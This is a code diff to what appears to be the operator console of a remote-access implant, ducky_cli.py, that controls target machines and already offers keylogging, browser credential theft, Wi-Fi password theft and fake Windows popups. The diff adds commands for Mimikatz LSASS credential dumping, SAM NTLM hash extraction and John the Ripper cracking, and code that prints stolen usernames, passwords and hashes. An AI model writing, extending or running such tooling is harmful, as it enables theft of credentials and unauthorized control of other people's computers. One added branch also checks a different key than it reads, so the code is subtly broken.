@@ -18,7 +18,8 @@ Commands available per target:
   info, processes, kill <pid>, arp_scan, ports, dns_cache, wifi_passwords,
   browser_creds, keylog start/stop/status/get, clipboard, open_url <url>,
   popup <title> | <message>, ls /path, cat /path, download /path,
-  run_script <name>, status, update
+  run_script <name>, mimikatz, crack_hash <hash>, john_crack, extract_hashes,
+  status, update
 
 Examples:
   ducky_cli.py office-pc info
@@ -349,6 +350,56 @@ def format_response(data):
         else:
             print()
 
+    # ── Mimikatz Credentials ──────────────────────────────
+    elif "credentials" in data and isinstance(data["credentials"], list):
+        creds = data["credentials"]
+        status = data.get("status", "")
+        print(f"\n  MIKATZ CREDENTIAL DUMP ({len(creds)} credential(s))\n")
+        print(f"  Status: {status}\n")
+
+        for i, cred in enumerate(creds, 1):
+            username = cred.get("username", "?")
+            password = cred.get("password", "")
+            hash_val = cred.get("hash", "")
+            print(f"  [{i}] CREDENTIAL\n")
+            print(f"      Username : {username}")
+            if password:
+                print(f"      Password : {password}")
+            if hash_val:
+                print(f"      NTLM Hash: {hash_val[:32]}...")
+            print()
+
+        raw = data.get("raw_output", "")
+        if raw and len(raw) > 100:
+            lines = [l for l in raw.splitlines() if l.strip()]
+            print(f"  ... ({len(lines)} total lines of output)\n")
+
+    # ── Hash Cracking Results ─────────────────────────────
+    elif "status" in data and ("cracked" in str(data.get("status", "")).lower() or "done" in str(data.get("status", "")).lower()):
+        if "cracked" in data and isinstance(data["cracked"], list):
+            cracked = data["cracked"]
+            print(f"\n  JOHN THE RIPPER - CRACKED {len(cracked)} HASH(ES)\n")
+            for item in cracked[:50]:
+                h = item.get("hash", "?")[:32] + "..."
+                pw = item.get("password", "")
+                print(f"  Hash:   {h}")
+                print(f"  Pass:   {pw}\n")
+        elif "hashes" in data and isinstance(data["extracted"], list):
+            hashes = data["hashes"]
+            print(f"\n  EXTRACTED {len(hashes)} NTLM HASH(ES) FROM SAM\n")
+            for h in hashes[:20]:
+                parts = h.split(":")
+                if len(parts) >= 2:
+                    user = parts[0]
+                    hash_val = parts[1][:32] + "..."
+                    print(f"  {user}:{hash_val}")
+        else:
+            output = data.get("raw_output", "")
+            lines = [l for l in output.splitlines() if l.strip()]
+            print(f"\n  JOHN OUTPUT ({len(lines)} lines)\n")
+            for line in lines[:100]:
+                print(f"  {line}")
+
     # ── File Listing ──────────────────────────────────────
     elif "files" in data:
         files = data["files"]
@@ -531,6 +582,14 @@ def show_command_help():
         "BROWSER": [
             "open_url <url>    - Open a URL in the browser",
             "popup <title> | <message>  - Show fake Windows popup",
+        ],
+        "CREDENTIAL DUMPING": [
+            "mimikatz          - Extract credentials from memory (LSASS)",
+            "extract_hashes    - Dump NTLM hashes from SAM database",
+        ],
+        "HASH CRACKING": [
+            "crack_hash <h>    - Crack an NTLM hash",
+            "john_crack         - Run John the Ripper on extracted hashes",
         ],
         "FILES": [
             "ls /path          - List files in a directory",
